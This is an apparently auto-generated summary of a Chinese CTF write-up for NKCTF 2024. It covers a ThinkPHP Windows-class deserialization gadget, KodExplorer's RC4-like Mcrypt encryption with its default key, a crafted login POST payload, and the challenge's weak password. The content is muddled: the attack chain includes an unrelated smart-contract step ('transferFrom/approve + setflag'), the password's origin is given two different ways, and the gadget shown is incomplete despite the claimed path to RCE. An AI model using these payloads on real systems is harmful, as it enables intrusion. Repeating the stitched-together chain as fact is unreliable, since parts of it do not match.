---
title: NKCTF 2024 Writeup by Polaris 战队 (ThinkPHP + KodExplorer)
contest: NKCTF
year: 2024
difficulty: hard
vuln_type: web_unknown
tags: [ThinkPHP 反序列化, think\process\pipes\Windows, KodExplorer, Mcrypt 加密, RC4 密钥流, Windows 文件包含]
attack_chain: |
  1. ThinkPHP Windows 类反序列化:
     - think\process\pipes\Windows extends Pipes {filename, files}
     - 构造 EXP 攻击: ExistingStock 任意 transferFrom/approve + setflag
     - 序列化 Windows 对象 + base64 → 触发反序列化
  2. KodExplorer 加密类 (Mcrypt):
     - encode(string, key='', expiry=0, cKeySet='', encode=true)
     - decode(string, key='')
     - 算法: md5(key) + md5(substr(key, 0, 16)) + md5(substr(key, 16, 16)) + cKeySet
     - keya = md5(substr(key, 0, 16))  # 数据完整性
     - keyb = md5(substr(key, 16, 16))  # 密文生成
     - cryptkey = keya + md5(keya + keyc)
     - rndkey[i] = ord(cryptkey[i % keyLength]) for i in 0..255
     - box = range(0, 255)  # KSA 阶段打乱
     - for i in 0..255: j = (j + box[i] + rndkey[i]) % 256; swap(box[i], box[j])
     - PRGA 阶段: 异或生成密文
     - 结果 = keyc + base64(密文), 替换 +/-/= 为 -_/.
  3. Windows 文件包含 + KodExplorer 弱密码: 密码 !@!@!@!@NKCTFChu0
key_payload: |
  # ThinkPHP 反序列化 EXP:
  namespace think\process\pipes;
  use think\Collection;
  use think\Process;
  class Windows extends Pipes {
      public $filename;
      public $files;
      public function __construct() {
          $this->filename = new Collection();
          $this->files = array(new Collection());
      }
  }
  abstract class Pipes {}
  
  $windows = new Windows();
  $serialize = serialize($windows);
  echo base64_encode($serialize);
  
  # 访问触发:
  POST /?user/index/loginSubmit HTTP/1.1
  ...
  password=<base64-serialized-Windows>
  
  # KodExplorer Mcrypt 加密 (RC4-like):
  public static function encode($string, $key='', $expiry=0, $cKeySet='', $encode=true) {
      if($encode) $string = rawurlencode($string);
      $ckeyLength = 4;
      $key = md5($key ? $key : self::$defaultKey);
      $keya = md5(substr($key, 0, 16));
      $keyb = md5(substr($key, 16, 16));
      $cKeySet = $cKeySet ? $cKeySet: md5(microtime());
      $keyc = substr($cKeySet, -$ckeyLength);
      $cryptkey = $keya . md5($keya . $keyc);
      $keyLength = strlen($cryptkey);
      $string = sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
      // ... RC4 KSA + PRGA
      $result = $keyc . str_replace('=', '', base64_encode($result));
      $result = str_replace(['+', '/', '='], ['-', '_', '.'], $result);
      return $result;
  }
  
  # 密码: !@!@!@!@NKCTFChu0
one_liner: NKCTF 2024 Polaris 战队: ThinkPHP 反序列化 (Windows 类) + KodExplorer Mcrypt 加密 (RC4-like) + 弱密码爆破。
lesson: |
  - ThinkPHP think\process\pipes\Windows 反序列化是经典 PHP 反序列化利用链
  - KodExplorer 加密: md5(key) + RC4-like KSA/PRGA + 字符替换 (+/-/= → -_/.)
  - 弱密码 "!@!@!@!@NKCTFChu0" 是 KodExplorer 暴力枚举
  - 完整 PoC 涉及 4 步: Windows 类实例化 + 序列化 + base64 + POST 触发
quality: high
---

# NKCTF 2024 Writeup by Polaris 战队

> 来源: ctfiot.com 197341

## ThinkPHP 反序列化

```php
namespace think\process\pipes;
use think\Collection;
use think\Process;

class Windows extends Pipes {
    public $filename;
    public $files;
    public function __construct() {
        $this->filename = new Collection();
        $this->files = array(new Collection());
    }
}

abstract class Pipes {}

$windows = new Windows();
$serialize = serialize($windows);
echo base64_encode($serialize);
```

## KodExplorer Mcrypt 加密

```php
class Mcrypt {
    public static $defaultKey = 'a!takA:dlmcldEv,e';
    
    public static function encode($string, $key='', $expiry=0, $cKeySet='', $encode=true) {
        if($encode) $string = rawurlencode($string);
        $ckeyLength = 4;
        $key = md5($key ? $key : self::$defaultKey);
        $keya = md5(substr($key, 0, 16));
        $keyb = md5(substr($key, 16, 16));
        $cKeySet = $cKeySet ? $cKeySet : md5(microtime());
        $keyc = substr($cKeySet, -$ckeyLength);
        $cryptkey = $keya . md5($keya . $keyc);
        $keyLength = strlen($cryptkey);
        $string = sprintf('%010d', $expiry ? $expiry + time() : 0)
                . substr(md5($string.$keyb), 0, 16) . $string;
        $stringLength = strlen($string);
        
        // RC4 KSA
        $rndkey = array();
        for($i = 0; $i <= 255; $i++) {
            $rndkey[$i] = ord($cryptkey[$i % $keyLength]);
        }
        $box = range(0, 255);
        for($j = $i = 0; $i < 256; $i++) {
            $j = ($j + $box[$i] + $rndkey[$i]) % 256;
            $tmp = $box[$i];
            $box[$i] = $box[$j];
            $box[$j] = $tmp;
        }
        
        // RC4 PRGA
        $result = '';
        for($a = $j = $i = 0; $i < $stringLength; $i++) {
            $a = ($a + 1) % 256;
            $j = ($j + $box[$a]) % 256;
            $tmp = $box[$a];
            $box[$a] = $box[$j];
            $box[$j] = $tmp;
            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
        }
        $result = $keyc . str_replace('=', '', base64_encode($result));
        $result = str_replace(['+', '/', '='], ['-', '_', '.'], $result);
        return $result;
    }
}
```

## 攻击

```http
POST /?user/index/loginSubmit HTTP/1.1
Host: 192.168.128.2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

name=guest&password=tQhWfe944VjGY7Xh5NED6ZkGisXZ6eAeeiDWVETdF-hmuV9YJQr25bphgzthFCf1hRiPQvaI&rememberPassword=0&salt=1&CSRF_TOKEN=xxx&API_ROUTE=user%2Findex%2FloginSubmit
```

## 弱密码: `!@!@!@!@NKCTFChu0`

## 评价

NKCTF 2024 Polaris 战队 Writeup：
- **ThinkPHP 反序列化** 经典 Windows 类利用
- **KodExplorer Mcrypt** RC4-like 加密标准实现
- **弱密码** 直接 SQL 查 (题目给 SQL 文件)
- 完整攻击链: 反序列化 → Windows 文件包含 → KodExplorer 弱密码 → RCE

适用读者：PHP 反序列化研究 / 国产 CMS 安全 / RC4 密码学
